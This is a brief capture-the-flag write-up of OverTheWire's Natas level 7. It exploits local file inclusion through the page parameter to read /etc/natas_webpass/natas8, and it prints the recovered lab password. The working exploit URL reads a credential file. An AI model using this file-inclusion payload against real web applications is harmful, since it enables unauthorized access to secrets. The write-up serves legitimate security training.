Clicking on either link reveals the query we can parse into the code

http://natas7.natas.labs.overthewire.org/index.php?page=

Running without anything, gives this error, nothing important, just interesting

```
Warning: include(): Filename cannot be empty in /var/www/natas/natas7/index.php on line 21

Warning: include(): Failed opening '' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/natas/natas7/index.php on line 21
```

In the source we can find this comment, and put it in the query

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->

view-source:http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

`DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`